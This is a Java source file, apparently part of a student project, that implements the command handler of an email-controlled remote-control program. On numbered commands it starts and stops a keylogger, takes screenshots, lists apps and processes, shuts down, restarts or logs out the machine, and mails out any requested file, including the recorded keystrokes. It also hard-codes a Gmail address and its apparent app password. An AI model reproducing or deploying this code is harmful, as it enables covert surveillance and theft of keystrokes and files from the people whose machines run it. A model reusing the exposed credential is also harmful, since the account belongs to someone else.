package com.example.project.server;

import com.example.project.features.getfile.GetFile;
import com.example.project.features.keylogger.KeyLog;
import com.example.project.features.list.ListApp;
import com.example.project.features.list.ListPrc;
import com.example.project.features.power.SRS;
import com.example.project.features.screenshot.Screenshot;
import com.example.project.mail.sendMail;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class sendResponse {
    final String DEFAULT_MAIL = "projectmangmaytinh2004@gmail.com";
    final String DEFAULT_PASSWORD = "gorabwfzyfuqfkgy";
    int index = 0;
    String key;
    private int[] counts = {0,0,0,0,0,0,0,0,0,0};


    private String getMail(String mail){
        if (!mail.contains(String.valueOf('<'))){
            return mail;
        }
        return mail.substring(mail.indexOf('<')+1,mail.indexOf('>'));
    }

    public sendResponse(String key){
        this.key = key;
    }
    KeyLog kl = new KeyLog();
    public void run() {
        if (Server.reqList.isEmpty()){
            return;
        }
        switch (Server.reqList.getLast()){
            //start keylog
            case "0": {
                ListApp la = new ListApp();
                File appList;
                try {
                    appList = la.run();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                sm.send(appList);
                break;
            }
            case "1": {
                kl.start();
                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                sm.sendContent("Successful");
                System.out.println(1);
                break;
            }
            //end keylog
            case "2": {
                String text = kl.end();
                counts[2]++;
                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                File file = new File("keylog.txt");
                try {
                    file.createNewFile();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                FileWriter fw;
                try {
                    fw = new FileWriter("keylog.txt");
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                try {
                    fw.write(text);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                sm.send(file);
                System.out.println(2);
                break;
            }
            //list app
            case "3": {
                ListPrc la = new ListPrc();
                File file;
                try {
                    file = la.run();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                sm.send(file);
                System.out.println(3);
                break;
            }
            //screenshot
            case "4": {
                Screenshot sc = new Screenshot();
                File file;
                file = sc.takeScreenShot();
                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                sm.send(file);
                System.out.println(4);
                break;
            }
            //shutdown
            case "5": {
                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                sm.sendContent("Successful");
                SRS.shutdown();
                break;
            }
            //restart
            case "6": {
                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                sm.sendContent("Successful");
                SRS.restart();
                break;
            }
            //logout
            case "7": {
                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                sm.sendContent("Successful");
                SRS.logout();
                break;
            }
            //sleep
            case "8": {
                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                sm.sendContent("Successful");
                SRS.sleep();
                break;
            }
            //getfile
            case "9": {
                GetFile gf = new GetFile();
                if (Server.reqList.get(index).length()<=2){
                    String text = gf.listDrive();
                    sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                    sm.sendContent(text);
                }
                else {
                    String path = Server.reqList.get(index).substring(2);
                    File file = new File(path);
                    if (file.isDirectory()){
                        String text = gf.listFile(file.getAbsolutePath());
                        sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                        sm.sendContent(text);
                    }
                    else {
                        if (file.exists()){
                            sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                            sm.send(file);
                        }
                        else{
                            sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                            sm.sendContent("File do not exist");
                        }
                    }
                }
                break;
            }
            default: {
                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 404");
                sm.sendContent("Wrong Request");
                System.out.println(5);
                break;
            }
        }
    }
}
